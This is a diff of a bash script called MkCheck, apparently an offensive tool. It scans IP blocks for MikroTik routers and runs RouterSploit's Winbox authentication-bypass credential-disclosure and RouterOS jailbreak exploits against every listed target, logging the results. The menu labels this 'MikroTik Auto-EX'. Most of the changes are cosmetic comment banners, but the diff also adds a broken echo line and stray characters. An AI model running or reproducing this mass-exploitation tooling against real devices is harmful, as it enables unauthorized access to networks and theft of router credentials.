@@ -15,9 +15,12 @@ UBLUE='\033[4;34m'
 URED='\033[4;31m'
 LCYN='\033[1;36m'
 Z=1
-#
-# Trap Control Init
-#
+
+#########################################
+#######################
+#  Trap Control Init  #
+#######################
+
 function trap_ctrlc (){
     # perform cleanup here
     echo -e "${URED}Ctrl-C caught...${NC}"
@@ -33,49 +36,83 @@ function trap_ctrlc (){
 	fi
 }
 
-#
-# Invoke trap_ctrlc
-#
+##########################################
+#######################
+#  Invoke trap_ctrlc  #
+#######################
+
 trap "trap_ctrlc" 2
 
-#
-## Privilige and File Checks
-#
+##########################################
+################################
+#   Privilige and File Checks  #
+################################
+
 sudo chown $USER:$USER -R /opt/MkCheck
 cd /opt/MkCheck
 
-#
-# Root Check
-#
+##########################################
+####################
+#    Root Check    #
+####################
+
 if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root"
    exit 1
 fi
 
-#
-# Result folder check
-#
+###########################################
+#######################
+# Result folder check #
+#######################
+
 if [[ ! -d '/opt/MkCheck/results' ]]; then
 	mkdir /opt/MkCheck/results
 fi
 
-#
-# RSF folder check
-#
+##########################################
+########################
+#   RSF folder check   #
+########################
+
 if [[ ! -d '/opt/MkCheck/results/RSF' ]]; then
 	mkdir /opt/MkCheck/results/RSF
 fi
 
-#
-# Vuln folder check
-#
+##########################################
+########################
+#   Vuln folder check  #
+########################
+
 if [[ ! -d '/opt/MkCheck/results/Vulns' ]]; then
 	mkdir /opt/MkCheck/results/Vulns
 fi
 
-#
-# Session Choice
-#
+#########################################################
+######################
+# (SE) Session Edit  #
+######################
+
+edit_session(){
+	echo -e "${YLW}This changs a single number set <xx.xx.132.xx>, to change multiple, just run this option again${NC}"
+	echo -e "${W}Please enter the name of the session to edit${NC}"
+	read SESHO
+	echo -e "${W}Please enter the number to be replaced${NC}"
+	read EXIT
+	echo -e "${W}Please enter the number to insert${NC}"
+	read ENTER
+	echo -e "${W}Please enter the name for this target files session${NC}"
+	read SESSION
+	echo ${SESSION} >> .conf
+	sed -i "s/${EXIT}/${ENTER}/g" files/.${SESHO}_res.txt
+	cp files/.${SESHO}_tiks.txt files/.${SESSION}_tiks.txt
+}
+
+##############################################################
+########################
+# (SC) Session Choice  #
+########################
+
 session_choice(){
   SESSION=$(cat .conf)
 	echo -e "${W}Previous Sessions: ${LP}${SESSION}${NC}"
@@ -100,42 +137,32 @@ session_choice(){
 	fi
 	echo -e "${W}Session: ${LP}${SESSION}${NC}"
 	
-	#
-	# RSF Session Folder Check
-	#
+	########################################################
+    ##############################
+	#  RSF Session Folder Check  #
+	##############################
+	
 	if [[ ! -d /opt/MkCheck/results/RSF/${SESSION} ]]; then
 			mkdir /opt/MkCheck/results/RSF/${SESSION}
 	fi
 	
-	#
-	# Vuln Session Folder Check
-	#
+	####################################################
+    ###############################
+	#  Vuln Session Folder Check  #
+	###############################
+	
 	if [[ ! -d /opt/MkCheck/results/Vulns/${SESSION} ]]; then
 		mkdir /opt/MkCheck/results/Vulns/${SESSION}
 	fi
 }
 
-#
-# Session Edit
-#
-edit_session(){
-	echo -e "${YLW}This changs a single number set <xx.xx.132.xx>, to change multiple, just run this option again${NC}"
-	echo -e "${W}Please enter the name of the session to edit${NC}"
-	read SESHO
-	echo -e "${W}Please enter the number to be replaced${NC}"
-	read EXIT
-	echo -e "${W}Please enter the number to insert${NC}"
-	read ENTER
-	echo -e "${W}Please enter the name for this target files session${NC}"
-	read SESHI
-	echo ${SESHI} >> .conf
-	sed -i "s/${EXIT}/${ENTER}/g" files/.${SESHO}_res.txt
-	cp files/.${SESHO}_tiks.txt files/.${SESHI}_tiks.txt
-}
 
-#
-# Session Check
-#
+
+###########################################
+#######################
+#    Session Check    #
+#######################
+
 if [[ ! -f '.conf' ]]; then
 	# First check to see if tiks.txt has data
 	RE=$(cat /opt/MkCheck/files/tiks.txt)
@@ -144,9 +171,12 @@ if [[ ! -f '.conf' ]]; then
 		echo "# LEAVE THIS LINE IN* (FOR BEST RESULTS USE AN ENTIRE IP BLOCK)" > /opt/MkCheck/files/tiks.txt
 		sudo nano /opt/MkCheck/files/tiks.txt
 	fi
-	#
-	# Second check to see if data is example data
-	#
+	
+	###################################################################
+    #################################################
+	#  Second check to see if data is example data  #
+	#################################################
+
 	RR=$(cat /opt/MkCheck/files/tiks.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
 	if [[ ${RR} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
 		sudo rm /opt/MkCheck/files/tiks.txt
@@ -160,22 +190,28 @@ if [[ ! -f '.conf' ]]; then
 	echo -e "${W}Session: ${LP}${SESSION}${NC}"
 	cp files/tiks.txt files/.${SESSION}_tiks.txt
 	
-	#
-	# RSF Session Folder Check
-	#
+	################################################
+	##############################
+	#  RSF Session Folder Check  #
+	##############################
+
 	mkdir /opt/MkCheck/results/RSF/${SESSION}
 	mkdir /opt/MkCheck/results/Vulns/${SESSION}
 else
 	
-	#
-	# Check to see if user will keep original data or replace
-	#
+	#############################################3###
+	####################################
+	# (SC) Check for data replacement  #
+	####################################
+
 	session_choice
 fi
 
-#
-# Routersploit file check (tiks.rsf.txt)
-#
+##########################################################
+############################################
+#  Routersploit file check (tiks.rsf.txt)  #
+############################################
+
 if [[ -f '/opt/MkCheck/files/tiks_rsf.txt' ]]; then
 	RT=$(cat /opt/MkCheck/files/tiks_rsf.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
 	if [[ ${RT} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
@@ -186,9 +222,11 @@ else
 	sudo cp files/tiks.txt files/tiks_rsf.txt
 fi
 
-#
-# Result file check (tiks_res.txt)
-#
+############################################################
+######################################
+#  Result file check (tiks_res.txt)  #
+######################################
+
 if [[ -f '/opt/MkCheck/files/tiks_res.txt' ]]; then
 	RS=$(cat /opt/MkCheck/files/tiks_res.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
 	if [[ ${RS} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
@@ -199,18 +237,22 @@ else
 	cp /opt/MkCheck/files/tiks.txt /opt/MkCheck/files/tiks_res.txt
 fi
 
-#
-# Insert new target for MCheck Attack
-#
+##########################################################3#
+##########################################
+#  Insert new target for MCheck Attack  #
+##########################################
+
 target(){
 	RARG=$(python3 scripts/get_t.py)
 	VAR=$(echo ${RARG})
 	FARG='host = "ARG"'
 }
 
-#
-# Host Auto Load
-#
+##########################################
+####################
+#  Host Auto Load  #
+####################
+
 running(){
 	mv files/tiks1.txt files/tiks.txt
 	# Start
@@ -220,9 +262,11 @@ running(){
 	echo -e "${UPURPLE}${Z}.${UBLUE}Next Target is ${YLW}${VAR}${NC}"
 }
 
-#
-# Final Results Correlation for Net AP Name
-#
+########################################################
+###############################################
+#  Final Results Correlation for Net AP Name  #
+###############################################
+
 apresults(){
 	for log in `cat /opt/MkCheck/files/tiks_res.txt`
 		do
@@ -239,9 +283,11 @@ apresults(){
 		done
 }
 
-#
-# Mikro Network AP Name Check (No Proxy)
-#
+############################################################33
+############################################
+#  Mikro Network AP Name Check (No Proxy)  #
+############################################
+
 mchecker(){
 	while [[ $Z -lt 255 ]];
 	do
@@ -267,9 +313,10 @@ mchecker(){
 	main
 }
 
-#
-# Network AP Discovery (with Proxy)
-#
+######################################################33###
+#######################################
+#  Network AP Discovery (with Proxy)  #
+#######################################
 pchecker(){
 	while [[ $Z -lt 255 ]];
 	do
@@ -295,23 +342,30 @@ pchecker(){
 	main
 }
 
-#
-# Routersploit Vuln Check
-#
+#######################################3##
+#############################
+#  Routersploit Vuln Check  #
+#############################
+
 rtsploit(){
 	cd /root/routersploit
 	for name in `cat /opt/MkCheck/files/tiks_rsf.txt`
 		do
-			#
-			#winbox_auth_bypass_creds_disclosure
-			#
+			
+			##################################################3##
+			#########################################
+			#  winbox_auth_bypass_creds_disclosure  #
+			#########################################
+
 			WINSAVE=$(sudo python3 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
 			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 			
-			#
-			# routeros_jailbreak
-			#
+			##########################################
+			########################
+			#  routeros_jailbreak  #
+			########################
+
 			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
 			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
@@ -320,9 +374,11 @@ rtsploit(){
 		done
 }
 
-#
-# Update Args
-#
+###########################################
+#################
+#  Update Args  #
+#################
+
 up_arg(){
     echo $1 >> temp.log
     echo $2 >> temp.log
@@ -371,9 +427,11 @@ update(){
   echo -e "${NC}"
 }
 
-#
-# Main Menu
-#
+##########################################
+###############
+#  Main Menu  #
+###############
+
 main(){
 	MODULE=''
 	echo -e "${BRED}"
@@ -385,6 +443,7 @@ main(){
     echo -e "${LGRY}Mikrotik RouterOS Jailbreak - ${W}Versions ${YLW}2.9.8 up to 6.41rc56${NC}"
 	echo -e "${W}Hit ${UBLUE}Ctrl + Z${NC} ${W}to background MkCheck or ${UBLUE}Ctrl + C${NC} ${W}to quit a scan${NC}"
 	echo ""
+	echo -e "${}"
 	echo -e "${RED}1. MikroTik Auto-EX"
 	echo -e "2. RouterSploit Vuln Check"
   	echo -e "3. Change Session"
@@ -425,9 +484,11 @@ main(){
 	fi
 }
 
-#
-# Start of MkCheck Script
-#
+##########################################
+#############################
+#  Start of MkCheck Script  #
+#############################
+
 cd /opt/MkCheck
 echo -e "${LP}"
 figlet MkCheck
